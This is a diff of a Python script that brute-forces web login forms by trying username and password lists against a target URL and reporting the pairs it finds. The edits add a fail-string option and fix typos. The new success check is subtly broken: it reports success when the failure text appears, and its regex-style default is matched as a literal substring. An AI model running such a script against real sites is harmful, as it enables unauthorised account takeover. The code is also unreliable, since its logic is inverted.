@@ -36,16 +36,14 @@ def attempt(url, user, pw, fail_str, verbose):
         timeout=10,
         allow_redirects=True,
     )
-    # request.history -> 리다이렉트 응답 기록 목록
-    isRedirected = len(request.history) > 0
-    failed = fail_str in request.text
+
+    if fail_str is None:
+        fail_str = "invalid|error|wrong|incorrect|denied|failed"
 
     if verbose:
         print(f"[-] {user}:{pw}")
-    if isRedirected or not failed:
-        # 일반적으로 리다이렉트 성공 -> 성공 신호
-        return True
-    return False
+
+    return fail_str in request.text
 
 
 def main():
@@ -53,8 +51,11 @@ def main():
     p.add_argument("-t", "--url", required=True, help="login form url")
     p.add_argument("-U", "--users", required=True, help="usernames file path")
     p.add_argument("-P", "--passwords", required=True, help="passwords file path")
-    p.add_argument("--delay", type=float, default=0, hdelp="delay float type")
-    p.add_argument("-v", "--verbose", action="stroe_true", help="verbose mode")
+    p.add_argument("-F", "--failstring", required=False, help="fail string")
+    p.add_argument(
+        "--delay", type=float, required=False, default=0, help="delay float type"
+    )
+    p.add_argument("-v", "--verbose", action="store_true", help="verbose mode")
 
     args = p.parse_args()
     users = [l.strip() for l in open(args.users) if l.strip()]
@@ -67,7 +68,7 @@ def main():
         found = False
         for pw in passwords:
             try:
-                if attempt(args.url, user, pw, args.fail, args.verbose):
+                if attempt(args.url, user, pw, args.failstring, args.verbose):
                     print(f"[+] found: {user}:{pw}")
                     found = True
                     break
